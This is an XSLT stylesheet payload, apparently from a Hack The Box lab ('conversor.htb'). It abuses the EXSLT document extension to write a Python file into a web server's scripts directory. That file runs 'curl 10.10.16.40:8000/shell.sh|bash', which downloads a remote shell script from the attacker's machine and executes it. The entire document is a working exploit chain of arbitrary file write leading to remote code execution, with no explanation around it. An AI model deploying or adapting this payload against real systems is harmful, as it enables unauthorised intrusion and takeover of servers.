<?xml version= "1.0" encoding= "UTF-8" ?>
<xsl:stylesheet  
    xmlns:xsl = "http://www.w3.org/1999/XSL/Transform"  
    xmlns:shell = "http://exslt.org/common" 
    extension-element-prefixes = "shell" 
    version = "1.0">
<xsl:template  match = "/" >
<shell:document  href = "/var/www/conversor.htb/scripts/shell.py"  method = "text" >
 import os
os.system("curl 10.10.16.40:8000/shell.sh|bash")
</shell:document >
</xsl:template >
</xsl:stylesheet >
